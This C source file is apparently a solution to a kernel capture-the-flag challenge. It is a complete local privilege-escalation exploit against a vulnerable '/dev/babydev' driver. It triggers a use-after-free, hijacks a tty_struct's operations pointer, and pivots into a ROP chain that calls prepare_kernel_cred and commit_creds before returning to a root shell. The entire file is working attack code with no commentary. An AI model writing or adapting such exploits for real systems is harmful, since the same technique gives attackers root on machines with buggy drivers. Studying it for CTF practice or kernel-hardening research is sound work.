#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <fcntl.h>
#include <stdio.h>

#define TTY_MAGIC 0x5401
#define BUF_SIZE  0x2e0

#define PREPARE_KERNEL_CRED 0xffffffff810a1810
#define COMMIT_CREDS        0xffffffff810a1420

typedef struct {
  int counter;
} atomic_t;

struct kref {
  atomic_t refcount;
};

struct tty_struct {
  int                          magic;
  struct kref                  kref;
  struct device               *dev;
  struct tty_driver           *driver;
  const struct tty_operations *ops;
  // ...
};

struct tty_operations {
  struct tty_struct *(*lookup)(struct tty_driver *driver, void *inode, int idx);
  int (*install)(struct tty_driver *driver, struct tty_struct *tty);
  void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
  int (*open)(struct tty_struct *tty, void *filp);
  void (*close)(struct tty_struct *tty, void *filp);
  void (*shutdown)(struct tty_struct *tty);
  void (*cleanup)(struct tty_struct *tty);
  int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
  int (*put_char)(struct tty_struct *tty, unsigned char ch);
  void (*flush_chars)(struct tty_struct *tty);
  int (*write_room)(struct tty_struct *tty);
  int (*chars_in_buffer)(struct tty_struct *tty);
  int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
  // ...
};

void dump(char *buf, uint64_t size) {
  for (uint64_t i = 0; i < size; i++) {
    if (i % 10 == 0)
      printf("\n%.4lu: ", i);
    printf("0x%.2x ", (uint8_t) * (buf + i));
  }
  printf("\n");
}

void shell() {
  if (getuid() != 0)
    puts("exploit failed :(");

  else {
    puts("exploit was successful, popping a shell");
    char *args[] = {"/bin/sh", NULL, NULL};
    execve("/bin/sh", args, NULL);
    perror("execve failed");
  }

  exit(1);
}

int main() {
  int  fd1 = -1, fd2 = -1, ret = 0;
  char buf[BUF_SIZE - 1];

  fd1 = open("/dev/babydev", O_RDWR);
  fd2 = open("/dev/babydev", O_RDWR);
  bzero(buf, sizeof(buf));

  if (fd1 < 0 || fd2 < 0) {
    perror("open failed");
    goto done;
  }

  if ((ret = ioctl(fd1, 0x10001, BUF_SIZE)) < 0) {
    perror("ioctl failed");
    goto done;
  }

  close(fd1);
  fd1 = -1;

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if ((fd1 = open("/dev/ptmx", O_RDONLY)) < 0) {
    perror("open failed (ptmx)");
    goto done;
  }

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if (TTY_MAGIC != *(uint16_t *)buf) {
    puts("failed to obtain the tty_struct");
    goto done;
  }

  puts("obtained the tty_struct");

  uint64_t              stack[0x100], i = 0;
  uint64_t              user_ss, user_rsp, user_rflags, user_cs;
  struct tty_struct    *tty = (void *)buf;
  struct tty_operations ops;

  __asm__("mov %%ss, %0\n"
          "mov %%rsp, %1\n"
          "pushfq\n"
          "pop %2\n"
          "mov %%cs, %3\n"
          : "=r"(user_ss), "=m"(user_rsp), "=r"(user_rflags), "=r"(user_cs));

  stack[i++] = 0;                   // rbp
  stack[i++] = 0xffffffff810d238d;  // pop rdi ; ret
  stack[i++] = 0;                   // rdi
  stack[i++] = PREPARE_KERNEL_CRED; // prepare_kernel_cred()
  stack[i++] = 0xffffffff8133b32e;  // mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
  stack[i++] = 0;                   // rbx
  stack[i++] = 0;                   // rbp
  stack[i++] = COMMIT_CREDS;        // commit_creds()
  stack[i++] = 0xffffffff81063694;  // swapgs ; pop rbp ; ret
  stack[i++] = 0;                   // rbp
  stack[i++] = 0xffffffff8181a797;  // iretq
  stack[i++] = (uint64_t)shell;     // shell()
  stack[i++] = user_cs;             // cs
  stack[i++] = user_rflags;         // rflags
  stack[i++] = user_rsp;            // rsp
  stack[i++] = user_ss;             // ss

  ops.ioctl = (void *)0xffffffff81154d2a; // push rdx ; mov edx, 0x415b0028 ; pop rsp ; pop rbp ; ret
  printf("new ioctl: %p\n", ops.ioctl);
  tty->ops = (void *)&ops;

  if ((ret = write(fd2, buf, sizeof(buf))) < 0) {
    perror("write failed");
    goto done;
  }

  printf("using gadget to switch to %p\n", stack);
  printf("should return to shell() at %p\n", shell);

  ioctl(fd1, 0, stack);

  puts("exploit failed :(");

done:
  if (fd1 > 0)
    close(fd1);

  if (fd2 > 0)
    close(fd2);

  return EXIT_FAILURE;
}
